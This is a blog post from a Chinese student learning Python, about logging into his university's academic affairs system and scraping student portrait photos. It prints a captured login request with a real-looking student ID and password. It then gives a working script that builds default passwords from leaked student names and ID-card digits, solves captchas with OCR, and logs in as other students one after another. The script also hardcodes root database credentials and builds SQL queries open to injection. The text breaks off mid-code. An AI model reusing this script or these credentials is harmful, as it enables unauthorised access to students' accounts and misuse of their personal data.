<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="最近学习Python，感觉从头学比较枯燥，刚好找到一份资料，可以组合出教务处的默认口令，就打算试试爬一下他们的教务处的头像。">
<meta name="keywords" content="Python,爬虫,csrf">
<meta property="og:type" content="article">
<meta property="og:title" content="Python学习之教务处的登录，以及安全思考">
<meta property="og:url" content="http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/index.html">
<meta property="og:site_name" content="Leej">
<meta property="og:description" content="最近学习Python，感觉从头学比较枯燥，刚好找到一份资料，可以组合出教务处的默认口令，就打算试试爬一下他们的教务处的头像。">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://blog.leej.me/images/QQ截图20161208010821.jpg">
<meta property="og:image" content="http://blog.leej.me/images/QQ截图20161208011656.jpg">
<meta property="og:image" content="http://blog.leej.me/images/QQ截图20161208012748.jpg">
<meta property="og:image" content="http://blog.leej.me/images/1.png">
<meta property="og:image" content="http://blog.leej.me/images/QQ截图20161209232639.jpg">
<meta property="og:image" content="http://blog.leej.me/images/QQ截图20161210055827.jpg">
<meta property="og:image" content="http://blog.leej.me/images/QQ截图20161210060534.jpg">
<meta property="og:updated_time" content="2018-03-13T05:53:25.284Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Python学习之教务处的登录，以及安全思考">
<meta name="twitter:description" content="最近学习Python，感觉从头学比较枯燥，刚好找到一份资料，可以组合出教务处的默认口令，就打算试试爬一下他们的教务处的头像。">
<meta name="twitter:image" content="http://blog.leej.me/images/QQ截图20161208010821.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Python学习之教务处的登录，以及安全思考</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- rss -->
    
    
</head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/leejgod">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2017/02/07/博客小记/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2017/01/19/Hash长度扩展攻击/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&text=Python学习之教务处的登录，以及安全思考"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&title=Python学习之教务处的登录，以及安全思考"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&is_video=false&description=Python学习之教务处的登录，以及安全思考"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Python学习之教务处的登录，以及安全思考&body=Check out this article: http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&title=Python学习之教务处的登录，以及安全思考"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&title=Python学习之教务处的登录，以及安全思考"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&title=Python学习之教务处的登录，以及安全思考"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&title=Python学习之教务处的登录，以及安全思考"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.leej.me/2017/01/19/Python学习之教务处的登录，以及安全思考/&name=Python学习之教务处的登录，以及安全思考&description=&lt;p&gt;最近学习Python，感觉从头学比较枯燥，刚好找到一份资料，可以组合出教务处的默认口令，就打算试试爬一下他们的教务处的头像。&lt;br&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析过程"><span class="toc-number">2.</span> <span class="toc-text">分析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#a-大致思路"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">a.大致思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关于单点登录SSO"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">关于单点登录SSO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#b-思路分析"><span class="toc-number">2.0.0.3.</span> <span class="toc-text">b.思路分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#c-实现过程"><span class="toc-number">2.0.0.4.</span> <span class="toc-text">c.实现过程</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#代码"><span class="toc-number">3.</span> <span class="toc-text">代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xx-py"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">xx.py</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#思考"><span class="toc-number">4.</span> <span class="toc-text">思考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-登录时验证方式简单，造成csrf"><span class="toc-number">4.0.1.</span> <span class="toc-text">1.登录时验证方式简单，造成csrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-要记得修改容易被猜出来的密码"><span class="toc-number">4.0.2.</span> <span class="toc-text">2.要记得修改容易被猜出来的密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#python学习中遇到的一些问题："><span class="toc-number">4.0.2.1.</span> <span class="toc-text">python学习中遇到的一些问题：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关链接："><span class="toc-number">4.0.3.</span> <span class="toc-text">相关链接：</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Python学习之教务处的登录，以及安全思考
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Leej</span>
      </span>
      
    <div class="postdate">
        <time datetime="2017-01-18T20:06:44.000Z" itemprop="datePublished">2017-01-19</time>
    </div>


      
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link" href="/tags/Python/">Python</a>, <a class="tag-link" href="/tags/csrf/">csrf</a>, <a class="tag-link" href="/tags/爬虫/">爬虫</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>最近学习Python，感觉从头学比较枯燥，刚好找到一份资料，可以组合出教务处的默认口令，就打算试试爬一下他们的教务处的头像。<br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚学习python，觉得比较枯燥总不知道从哪里入手，偶然一次，同学让我帮忙看看选课，发给我的是学校统一的默认格式的密码，突然就想试试有多少人还是默认密码，从QQ群里找了一份学生信息尝试了一下，发现默认密码的还是挺多的，我就想是不是可以通过脚本来做一些有趣的事情。</p>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h4 id="a-大致思路"><a href="#a-大致思路" class="headerlink" title="a.大致思路"></a>a.大致思路</h4><p>打开学校教务处官网，正常登陆一波，发现页面跳转到<code>http://210.41.224.117/Login/xLogin/Login.asp</code></p>
<p><img src="\images\QQ截图20161208010821.jpg" alt="QQ截图20161208010821"></p>
<p>填写密码登陆，发现登陆页面又跳转回到了教务处<img src="\images\QQ截图20161208011656.jpg" alt="QQ截图20161208011656"></p>
<p>流程就是教务处点击登录，页面被带到一个认证平台认证，成功后回到教务处。</p>
<p>这样看太过于笼统，抓包分析一下。<img src="\images\QQ截图20161208012748.jpg" alt="QQ截图20161208012748"></p>
<p>这是登录前从教务处到认证平台的过程，有好几个302，仔细看了一下大致是从<code>http://jxgl.cuit.edu.cn/JXGL/xs/MainMenu.asp</code>页面，跳转到一个可能是判断用户是否登录的页面，然后在跳到<code>http://jxgl.cuit.edu.cn/Jxgl/Login/tyLogin.asp</code>这个页面，之后跳转到认证页面<code>http://210.41.224.117/Login/qqLogin.asp</code></p>
<p>这大概是个单点登陆的过程</p>
<h4 id="关于单点登录SSO"><a href="#关于单点登录SSO" class="headerlink" title="关于单点登录SSO"></a>关于单点登录SSO</h4><p>一、什么是单点登录SSO（Single Sign-On）</p>
<p>　　SSO是一种统一认证和授权机制，指访问同一服务器不同应用中的受保护资源的同一用户，只需要登录一次，即通过一个应用中的安全验证后，再访问其他应用中的受保护资源时，不再需要重新登录验证。</p>
<p><strong>简单点说，就是一个帐号,多个系统都能使用,且只要登录第一个系统,待认证通过后,其它系统可以直接使用,而不需要再次登录.</strong></p>
<p>二、为什么要用</p>
<ul>
<li><p><em>提高用户的效率</em>。用户不再被多次登录困扰，也不需要记住多个 ID 和密码。另外，用户忘记密码并求助于支持人员的情况也会减少。</p>
</li>
<li><p><em>提高开发人员的效率</em>。SSO 为开发人员提供了一个通用的身份验证框架。实际上，如果 SSO 机制是独立的，那么开发人员就完全不需要为身份验证操心。他们可以假设，只要对应用程序的请求附带一个用户名，身份验证就已经完成了。</p>
</li>
<li><p><em>简化管理</em>。如果应用程序加入了单点登录协议，管理用户帐号的负担就会减轻。简化的程度取决于应用程序，因为 SSO 只处理身份验证。所以，应用程序可能仍然需要设置用户的属性（比如访问特权）。</p>
<p>​</p>
</li>
</ul>
<p>三、SSO实现机制</p>
<p>SSO大概有以下几种方式实现：</p>
<ul>
<li><p><em>共享Cookie</em></p>
<p>当我们的子系统都在一个父级域名下时，我们可以将Cookie种在父域下，这样浏览器同域名下的Cookie则可以共享，这样可以通过Cookie加解密的算法获取用户SessionID，从而实现SSO。<br>但是，后面我们发现这种方式有几种弊端：<br>a. 所有同域名的系统都能获取SessionID，易被修改且不安全；<br>b. 跨域无法使用。<br>所以到后面抛弃这种做法。</p>
</li>
<li><p><em>Ticket验证</em></p>
<p>这种实现的SSO有以下几个步骤：<br>a. 用户访问某个子系统，发现如果未登录，则引导用户跳转到SSO登录页面；<br>b. 判断SSO是否已经登录；<br>c. 如果已经登录，直接跳转到回调地址，并返回认证ticket；<br>d. 如果未登录，用户正确输入用户名/密码，认证通过跳转到回调地址，并返回认证ticket；<br>e. 子系统获取ticket，调用SSO获取用户uid等信息，成功后让用户登录。</p>
</li>
</ul>
<p><img src="\images\1.png" alt="1"></p>
<p>​                            <code>Ticket验证时序图</code></p>
<p>四、学校网站登陆的实现</p>
<p>a. 学生访问某个子系统如教务处，发现如果未登录，发送一个带OSid参数的地址引导用户跳转到SSO登录页面；<br>b. 通过判断OSid来判断SSO是否已经登录；<br>c. 如果已经登录，直接跳转到回调地址，服务器端认证当前OSid；<br>d. 如果未登录，用户正确输入用户名/密码，认证通过跳转到回调地址；<br>e. 子系统获取OSid，调用SSO获取用户uid等信息，成功后让用户登录。</p>
<h4 id="b-思路分析"><a href="#b-思路分析" class="headerlink" title="b.思路分析"></a>b.思路分析</h4><p>对数据包进行具体的分析</p>
<p>发现具体setcookie和分配OSid是在这个页面<code>http://jxgl.cuit.edu.cn/Jxgl/Login/tyLogin.asp</code></p>
<p><img src="\images\QQ截图20161209232639.jpg" alt="QQ截图20161209232639"></p>
<p>我只需要先访问一次这个页面，获取了cookie和OSid即可，打开一个会话通过提交OSid参数访问认证平台，认证通过了即代表我教务处的回话处于登录状态。</p>
<p>知道过程还需要知道登录时具体需要哪些参数，看一下具体post的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /Login/xLogin/Login.asp HTTP/1.1</span><br><span class="line">Host: 210.41.224.117</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://210.41.224.117/Login/xLogin/Login.asp</span><br><span class="line">Cookie: ASPSESSIONIDQAABSBDB=GELMKBJBABOODECPPGIDDKMC</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 122</span><br><span class="line"></span><br><span class="line">WinW=2560&amp;WinH=1080&amp;txtId=2016122150&amp;txtMM=WYH020257a&amp;verifycode=rew&amp;codeKey=19056&amp;Login=Check&amp;IbtnEnter.x=0&amp;IbtnEnter.y=0</span><br></pre></td></tr></table></figure>
<p><code>WinW=2560&amp;WinH=1080</code>这两个是屏幕分辨率，<code>txtId=2016122150&amp;txtMM=WYH020257a</code>这两个是账号密码，<code>verifycode=rew</code>这是验证码，<code>codeKey=19056</code>这是一个判断页面是否是同一个页面的参数这个试了好久发现这个修改一下就认证不起，这个具体参数在第一次请求的源码里面可以找到</p>
<h4 id="c-实现过程"><a href="#c-实现过程" class="headerlink" title="c.实现过程"></a>c.实现过程</h4><p>1.新建会话访问<code>http://210.41.224.117/Login/xLogin/Login.asp</code>首先获取OSid，和cookie，还有codeKey</p>
<p>2.获取验证码<code>http://210.41.224.117/Login/xLogin/yzmDvCode.asp?k=%s&amp;t=1480853802484</code>(这里k就是之前获取的codeKey)</p>
<p>3.提交数据登录<code>http://210.41.224.117/Login/xLogin/Login.asp</code></p>
<p>4.判断登录状态，获取头像</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h4 id="xx-py"><a href="#xx-py" class="headerlink" title="xx.py"></a>xx.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get,post,Session</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"><span class="keyword">import</span> hz</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">login_heard = &#123;</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"</span>,</span><br><span class="line">		<span class="string">"Referer"</span>: <span class="string">"http://210.41.224.117/Login/xLogin/Login.asp"</span></span><br><span class="line">	&#125;</span><br><span class="line">postdata = &#123;</span><br><span class="line"><span class="string">"WinW"</span>: <span class="string">"2560"</span>,</span><br><span class="line"><span class="string">"WinH"</span>: <span class="string">"1080"</span>,</span><br><span class="line"><span class="string">"txtId"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"txtMM"</span>:<span class="string">""</span>,</span><br><span class="line"><span class="string">"verifycode"</span>:<span class="string">""</span>,</span><br><span class="line"><span class="string">"codeKey"</span>:<span class="string">''</span>,</span><br><span class="line"><span class="string">"Login"</span>:<span class="string">"Check"</span>,</span><br><span class="line"><span class="string">"IbtnEnter.x"</span>:<span class="number">62</span>,</span><br><span class="line"><span class="string">"IbtnEnter.y"</span>:<span class="number">54</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loginurl=<span class="string">"http://210.41.224.117/Login/xLogin/Login.asp"</span></span><br><span class="line">codeurl=<span class="string">"http://210.41.224.117/Login/xLogin/yzmDvCode.asp?k=%s&amp;t=1480853802484"</span> <span class="comment">#验证码</span></span><br><span class="line">getpicurl=<span class="string">"http://210.41.224.117/Login/GetZpPic.asp"</span> <span class="comment">#获取头像</span></span><br><span class="line">jwclogin=<span class="string">"http://jxgl.cuit.edu.cn/Jxgl/Login/tyLogin.asp"</span> <span class="comment">#获取uid</span></span><br><span class="line">jwclogout=<span class="string">"http://jxgl.cuit.edu.cn/Jxgl/UserPub/Logout.asp?UTp=Xs"</span><span class="comment">#注销登录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span><span class="params">()</span>:</span></span><br><span class="line">	id =<span class="string">""</span></span><br><span class="line">	ClassID = <span class="string">""</span></span><br><span class="line">	gread = <span class="string">""</span></span><br><span class="line">	zhuanye = <span class="string">""</span></span><br><span class="line">	name = <span class="string">""</span></span><br><span class="line">	passwd = <span class="string">""</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,ID)</span>:</span></span><br><span class="line">		self.id = ID</span><br><span class="line">		self.passwd = getpass(id)</span><br><span class="line">		<span class="comment">#print passwd,id</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getxx</span><span class="params">(StudentID)</span>:</span></span><br><span class="line">	db = MySQLdb.connect(<span class="string">"192.168.14.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"cuit"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line">	cursor = db.cursor()</span><br><span class="line">	sql = <span class="string">"SELECT StudentID,ClassID,zyid,Gread FROM cuit.xsxx WHERE  StudentID= %s"</span> %StudentID</span><br><span class="line">	cursor.execute(sql)</span><br><span class="line">	xx = cursor.fetchall()</span><br><span class="line">	db.close()</span><br><span class="line">	<span class="keyword">return</span> xx</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getid_0</span><span class="params">(gread,zhuanye,ClassID)</span>:</span></span><br><span class="line">	db = MySQLdb.connect(<span class="string">"192.168.14.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"cuit"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line">	cursor = db.cursor()</span><br><span class="line">	sql = <span class="string">"SELECT StudentID,ClassID,zyid,Gread FROM cuit.xsxx WHERE `ClassID` = '%s' and zyid=%s and gread = %s"</span> %(ClassID,zhuanye,gread)</span><br><span class="line">	cursor.execute(sql)</span><br><span class="line">	id = cursor.fetchall()</span><br><span class="line">	db.close()</span><br><span class="line">	<span class="comment">#print sql</span></span><br><span class="line">	<span class="keyword">return</span> id</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getid_1</span><span class="params">(gread)</span>:</span></span><br><span class="line">	db = MySQLdb.connect(<span class="string">"192.168.14.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"cuit"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line">	cursor = db.cursor()</span><br><span class="line">	sql1 = <span class="string">"SELECT StudentID,ClassID,zyid,Gread FROM cuit.xsxx WHERE Gread = %d "</span> %(gread)</span><br><span class="line"></span><br><span class="line">	cursor.execute(sql1)</span><br><span class="line">	id = cursor.fetchall()</span><br><span class="line">	db.close()</span><br><span class="line">	<span class="comment">#print sql</span></span><br><span class="line">	<span class="keyword">return</span> id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpass</span><span class="params">(id)</span>:</span></span><br><span class="line">	db = MySQLdb.connect(<span class="string">"192.168.14.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"cuit"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line">	cursor = db.cursor()</span><br><span class="line">	sql = <span class="string">"select CONCAT(Name,RIGHT(IDcard,6)) from cuit.xsxx where StudentID = '%s'"</span> %id</span><br><span class="line">	cursor.execute(sql)</span><br><span class="line">	data = cursor.fetchone()</span><br><span class="line">	password=<span class="string">u'%s'</span> %data</span><br><span class="line">	<span class="comment">#print(password)</span></span><br><span class="line">	password = hz.main(password)</span><br><span class="line">	password=password+<span class="string">"a"</span></span><br><span class="line">	db.close()</span><br><span class="line">	<span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcode</span><span class="params">(code)</span>:</span></span><br><span class="line">	image = Image.open(code)</span><br><span class="line">	vcode = pytesseract.image_to_string(image)</span><br><span class="line">	vcode = re.sub(<span class="string">r'\W'</span>,<span class="string">""</span>,vcode)</span><br><span class="line">	<span class="keyword">return</span> str(vcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(xiaomin,path)</span>:</span></span><br><span class="line">	S = Session()</span><br><span class="line">	<span class="comment"># 先访问login页面，拿cookies,codeKey</span></span><br><span class="line">	R_1 = S.get(loginurl,headers=login_heard)</span><br><span class="line">	R_1.encoding = <span class="string">"GB2312"</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#匹配codekey 格式：var codeKey = '587913';</span></span><br><span class="line">	codeKey = re.findall(<span class="string">"var codeKey = '(.*)';"</span>, R_1.text)</span><br><span class="line">	postdata[<span class="string">"codeKey"</span>]=str(codeKey[<span class="number">0</span>])</span><br><span class="line">	flag = <span class="number">-1</span></span><br><span class="line">	changdu = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> flag == <span class="number">-1</span>:</span><br><span class="line">		changdu = changdu +<span class="number">1</span></span><br><span class="line">		<span class="comment">#使用code去刷新验证码</span></span><br><span class="line">		R_yzm = S.get(codeurl % codeKey[<span class="number">0</span>],headers=login_heard)</span><br><span class="line">		<span class="comment">#保存验证码</span></span><br><span class="line">		<span class="keyword">with</span> open(<span class="string">"code.bmp"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">			code.write(R_yzm.content)</span><br><span class="line"></span><br><span class="line">		yzm=getcode(<span class="string">"code.bmp"</span>)</span><br><span class="line"></span><br><span class="line">		postdata[<span class="string">"verifycode"</span>]=yzm</span><br><span class="line">		postdata[<span class="string">"txtId"</span>]=xiaomin.id</span><br><span class="line">		postdata[<span class="string">"txtMM"</span>]=xiaomin.passwd</span><br><span class="line"></span><br><span class="line">		R_post = S.post(loginurl,headers=login_heard,data=postdata)</span><br><span class="line">		R_post.encoding = <span class="string">"gbk"</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"LoginOK!"</span> <span class="keyword">in</span> R_post.text :</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">			<span class="keyword">print</span> (str(xiaomin.id)+<span class="string">":"</span>+str(xiaomin.passwd))</span><br><span class="line">		<span class="keyword">if</span> <span class="string">u"验证码不匹配，请重新输入验证码！"</span> <span class="keyword">in</span> R_post.text :</span><br><span class="line">			flag = <span class="number">-1</span></span><br><span class="line">			<span class="comment">#print ("验证码错误！")</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">u"用户名和密码均区分大小写，其中至少一项输入有误，请重新输入！"</span> <span class="keyword">in</span> R_post.text :</span><br><span class="line">			flag = 